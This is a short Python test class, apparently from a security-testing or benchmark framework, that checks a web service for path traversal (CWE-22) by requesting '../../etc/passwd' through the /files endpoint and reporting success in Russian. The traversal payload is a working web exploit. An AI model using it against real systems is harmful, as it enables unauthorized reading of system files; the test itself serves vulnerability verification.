from mosaic.oracle.exploit import ExploitTest


class PathTraversalExploit(ExploitTest):
    """Read a file outside files/ via the path query parameter."""

    @property
    def chain_id(self) -> str:
        return "hivetrace_path_traversal"

    def execute(self) -> tuple[bool, str]:
        resp = self.http_get("/files", params={"path": "../../etc/passwd"})
        if resp.ok and "root:" in resp.text:
            return True, "Прочитан /etc/passwd вне каталога files/ (CWE-22)."
        return False, "Не удалось прочитать файл вне каталога files/."
